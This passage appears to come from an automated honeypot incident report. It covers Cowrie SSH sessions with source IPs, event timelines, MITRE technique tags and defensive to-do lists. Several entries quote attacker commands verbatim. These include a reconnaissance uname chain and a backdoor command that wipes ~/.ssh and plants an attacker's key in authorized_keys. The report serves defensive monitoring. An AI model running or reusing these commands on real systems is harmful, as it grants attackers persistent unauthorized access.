- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a7cd508e0a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:30 |
| **Last Seen** | 2026-09-03 14:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:30:53` | `cowrie.session.connect` |
| `2026-09-03 14:30:54` | `cowrie.client.version` |
| `2026-09-03 14:30:54` | `cowrie.client.kex` |
| `2026-09-03 14:30:56` | `cowrie.login.success` |
| `2026-09-03 14:30:59` | `cowrie.session.params` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.success` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.command.input` |
| `2026-09-03 14:30:59` | `cowrie.log.closed` |
| `2026-09-03 14:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e657ff9eedbf

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]140` |
| **First Seen** | 2026-09-03 14:31 |
| **Last Seen** | 2026-09-03 14:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:31:01` | `cowrie.session.connect` |
| `2026-09-03 14:31:01` | `cowrie.client.version` |
| `2026-09-03 14:31:01` | `cowrie.client.kex` |
| `2026-09-03 14:31:02` | `cowrie.login.success` |
| `2026-09-03 14:31:03` | `cowrie.session.params` |
| `2026-09-03 14:31:03` | `cowrie.command.input` |
| `2026-09-03 14:31:03` | `cowrie.command.failed` |
| `2026-09-03 14:31:03` | `cowrie.log.closed` |
| `2026-09-03 14:31:04` | `cowrie.session.params` |
| `2026-09-03 14:31:04` | `cowrie.command.input` |
| `2026-09-03 14:31:04` | `cowrie.session.file_download` |
| `2026-09-03 14:31:04` | `cowrie.log.closed` |
| `2026-09-03 14:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]140` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72288c83243

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]140` |
| **First Seen** | 2026-09-03 14:31 |
| **Last Seen** | 2026-09-03 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:31:04` | `cowrie.session.connect` |
| `2026-09-03 14:31:04` | `cowrie.client.version` |
| `2026-09-03 14:31:04` | `cowrie.client.kex` |
| `2026-09-03 14:31:05` | `cowrie.login.success` |
| `2026-09-03 14:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]140` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0825401dc3

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]140` |
| **First Seen** | 2026-09-03 14:31 |
| **Last Seen** | 2026-09-03 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:31:05` | `cowrie.session.connect` |
| `2026-09-03 14:31:05` | `cowrie.client.version` |
| `2026-09-03 14:31:05` | `cowrie.client.kex` |
| `2026-09-03 14:31:06` | `cowrie.login.success` |
| `2026-09-03 14:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]140` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94d3b44ca6c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:33 |
| **Last Seen** | 2026-09-03 14:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:33:14` | `cowrie.session.connect` |
| `2026-09-03 14:33:15` | `cowrie.client.version` |
| `2026-09-03 14:33:15` | `cowrie.client.kex` |
| `2026-09-03 14:33:17` | `cowrie.login.success` |
| `2026-09-03 14:33:18` | `cowrie.session.params` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.success` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:18` | `cowrie.command.input` |
| `2026-09-03 14:33:19` | `cowrie.log.closed` |
| `2026-09-03 14:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a0322aac81

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:35 |
| **Last Seen** | 2026-09-03 14:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:35:04` | `cowrie.session.connect` |
| `2026-09-03 14:35:04` | `cowrie.client.version` |
| `2026-09-03 14:35:04` | `cowrie.client.kex` |
| `2026-09-03 14:35:07` | `cowrie.login.success` |
| `2026-09-03 14:35:07` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:35:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:35:07` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c455590d63bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:35 |
| **Last Seen** | 2026-09-03 14:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:35:27` | `cowrie.session.connect` |
| `2026-09-03 14:35:27` | `cowrie.client.version` |
| `2026-09-03 14:35:27` | `cowrie.client.kex` |
| `2026-09-03 14:35:28` | `cowrie.login.success` |
| `2026-09-03 14:35:28` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:35:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:35:28` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4741f26ae4e

| Field | Detail |
|---|---|
| **Source IP** | `220.246.183[.]78` |
| **First Seen** | 2026-09-03 14:35 |
| **Last Seen** | 2026-09-03 14:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:35:27` | `cowrie.session.connect` |
| `2026-09-03 14:35:27` | `cowrie.client.version` |
| `2026-09-03 14:35:27` | `cowrie.client.kex` |
| `2026-09-03 14:35:28` | `cowrie.login.success` |
| `2026-09-03 14:35:29` | `cowrie.session.params` |
| `2026-09-03 14:35:29` | `cowrie.command.input` |
| `2026-09-03 14:35:29` | `cowrie.command.failed` |
| `2026-09-03 14:35:30` | `cowrie.log.closed` |
| `2026-09-03 14:35:30` | `cowrie.session.params` |
| `2026-09-03 14:35:30` | `cowrie.command.input` |
| `2026-09-03 14:35:31` | `cowrie.session.file_download` |
| `2026-09-03 14:35:31` | `cowrie.log.closed` |
| `2026-09-03 14:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.183[.]78` to AbuseIPDB if not already reported
- [ ] Block `220.246.183[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc37aa50da57

| Field | Detail |
|---|---|
| **Source IP** | `220.246.183[.]78` |
| **First Seen** | 2026-09-03 14:35 |
| **Last Seen** | 2026-09-03 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:35:31` | `cowrie.session.connect` |
| `2026-09-03 14:35:31` | `cowrie.client.version` |
| `2026-09-03 14:35:31` | `cowrie.client.kex` |
| `2026-09-03 14:35:32` | `cowrie.login.success` |
| `2026-09-03 14:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.183[.]78` to AbuseIPDB if not already reported
- [ ] Block `220.246.183[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3011461a046

| Field | Detail |
|---|---|
| **Source IP** | `220.246.183[.]78` |
| **First Seen** | 2026-09-03 14:35 |
| **Last Seen** | 2026-09-03 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:35:32` | `cowrie.session.connect` |
| `2026-09-03 14:35:32` | `cowrie.client.version` |
| `2026-09-03 14:35:33` | `cowrie.client.kex` |
| `2026-09-03 14:35:33` | `cowrie.login.success` |
| `2026-09-03 14:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.183[.]78` to AbuseIPDB if not already reported
- [ ] Block `220.246.183[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d022ac282f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:35 |
| **Last Seen** | 2026-09-03 14:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:35:33` | `cowrie.session.connect` |
| `2026-09-03 14:35:34` | `cowrie.client.version` |
| `2026-09-03 14:35:34` | `cowrie.client.kex` |
| `2026-09-03 14:35:37` | `cowrie.login.success` |
| `2026-09-03 14:35:39` | `cowrie.session.params` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.success` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:39` | `cowrie.command.input` |
| `2026-09-03 14:35:40` | `cowrie.log.closed` |
| `2026-09-03 14:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d12e1700174

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:37 |
| **Last Seen** | 2026-09-03 14:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:37:50` | `cowrie.session.connect` |
| `2026-09-03 14:37:50` | `cowrie.client.version` |
| `2026-09-03 14:37:50` | `cowrie.client.kex` |
| `2026-09-03 14:37:53` | `cowrie.login.success` |
| `2026-09-03 14:37:55` | `cowrie.session.params` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.success` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:55` | `cowrie.command.input` |
| `2026-09-03 14:37:56` | `cowrie.log.closed` |
| `2026-09-03 14:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95f04ea0f7ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:40 |
| **Last Seen** | 2026-09-03 14:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:40:07` | `cowrie.session.connect` |
| `2026-09-03 14:40:07` | `cowrie.client.version` |
| `2026-09-03 14:40:07` | `cowrie.client.kex` |
| `2026-09-03 14:40:11` | `cowrie.login.success` |
| `2026-09-03 14:40:14` | `cowrie.session.params` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.success` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.command.input` |
| `2026-09-03 14:40:14` | `cowrie.log.closed` |
| `2026-09-03 14:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a71ffabdc1e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:42 |
| **Last Seen** | 2026-09-03 14:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:42:23` | `cowrie.session.connect` |
| `2026-09-03 14:42:24` | `cowrie.client.version` |
| `2026-09-03 14:42:24` | `cowrie.client.kex` |
| `2026-09-03 14:42:27` | `cowrie.login.success` |
| `2026-09-03 14:42:29` | `cowrie.session.params` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.success` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.command.input` |
| `2026-09-03 14:42:29` | `cowrie.log.closed` |
| `2026-09-03 14:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9de34a79ede7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:45 |
| **Last Seen** | 2026-09-03 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:45:16` | `cowrie.session.connect` |
| `2026-09-03 14:45:16` | `cowrie.client.version` |
| `2026-09-03 14:45:17` | `cowrie.client.kex` |
| `2026-09-03 14:45:18` | `cowrie.login.success` |
| `2026-09-03 14:45:18` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:45:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:45:18` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d20d7901b0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:46 |
| **Last Seen** | 2026-09-03 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:46:05` | `cowrie.session.connect` |
| `2026-09-03 14:46:05` | `cowrie.client.version` |
| `2026-09-03 14:46:06` | `cowrie.client.kex` |
| `2026-09-03 14:46:06` | `cowrie.login.success` |
| `2026-09-03 14:46:07` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:46:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:46:07` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8db8ee8334d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:46 |
| **Last Seen** | 2026-09-03 14:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
